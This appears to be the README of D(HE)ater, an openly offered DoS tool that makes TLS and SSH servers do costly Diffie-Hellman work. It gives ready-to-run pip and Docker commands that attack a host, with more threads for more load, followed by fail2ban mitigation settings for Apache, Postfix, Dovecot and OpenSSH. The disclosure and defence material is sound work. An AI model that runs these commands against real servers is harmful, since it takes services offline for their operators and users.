# D(HE)ater

D(HE)ater is an attacking tool based on CPU heating in that it forces the ephemeral variant of
[Diffie-Hellman key exchange](https://en.wikipedia.org/wiki/Diffie%E2%80%93Hellman_key_exchange) (DHE) in given
cryptography protocols (e.g. TLS, SSH). It is performed without calculating a cryptographically correct ephemeral key on
the client side, but with a significant amount of calculation on the server side. Based on this, D(HE)ater can initiate 
a [denial-of-service (DoS) attack](https://en.wikipedia.org/wiki/Denial-of-service_attack).

## Quick start

D(HE)ater can be installed directly via [pip](https://pip.pypa.io/en/stable/) from
[PyPi](https://pypi.org/project/dheater/)

```console
pip install dheater
dheat --protocol tls www.example.com
dheat --protocol ssh www.example.com
```

or can be used via [Docker](https://www.docker.com/) from
[Docker Hub](https://hub.docker.com/repository/docker/balasys/dheater)

```console
docker pull balasys/dheater
docker run --rm balasys/dheater --protocol tls www.example.com
docker run --rm balasys/dheater --protocol ssh www.example.com
```

You can increase a load by string extra threads.

```console
dheat --thread-num 4 --protocol tls www.example.com
docker run --rm balasys/dheater --thread-num 4 --protocol tls www.example.com
docker run --rm balasys/dheater --thread-num 4 --protocol ssh www.example.com
```

## Mitigation

### Fail2Ban

#### TLS

#### Apache

There is no necessary filters.

1. `apache-ssl.conf` in `fail2ban` directory should be copied `filter.d` directory under the fail2ban configuration
    directory
1. the followings should be added to `jail.local` file in fail2ban configuration directory

```ini
[apache-ssl]

port    = https
logpath = %(apache_error_log)s
maxretry = 1
```

##### Postfix

There is a necessary filters, but it is applied only in ddos mode. The followings should be added to `jail.local`.

```ini
[postfix]
mode = ddos
```

##### Dovecot

There is a necessary filters, but it is applied only in ddos mode. The followings should be added to `jail.local`.

```ini
[dovecot]
mode = aggressive
```

or a specific filter can be used without changing the mode of the dovecot filter.

1. `dovecot-ssl.conf` in `fail2ban` directory should be copied `filter.d` directory under the fail2ban configuration
    directory
1. the followings should be added to `jail.local` file in fail2ban configuration directory

```ini
[dovecot-ssl]

port    = pop3,pop3s,imap,imaps,submission,465,sieve
logpath = %(dovecot_log)s
backend = %(dovecot_backend)s
maxretry = 1
```

#### SSH

##### OpenSSH

There is a necessary filters, but it is applied only in ddos mode. The followings should be added to `jail.local`.

```ini
[sshd]
mode = ddos
```

## License

The code is available under the terms of Apache License Version 2.0. 
A non-comprehensive, but straightforward description and also the full license text can be found at 
[Choose an open source license](https://choosealicense.com/licenses/apache-2.0/) website.
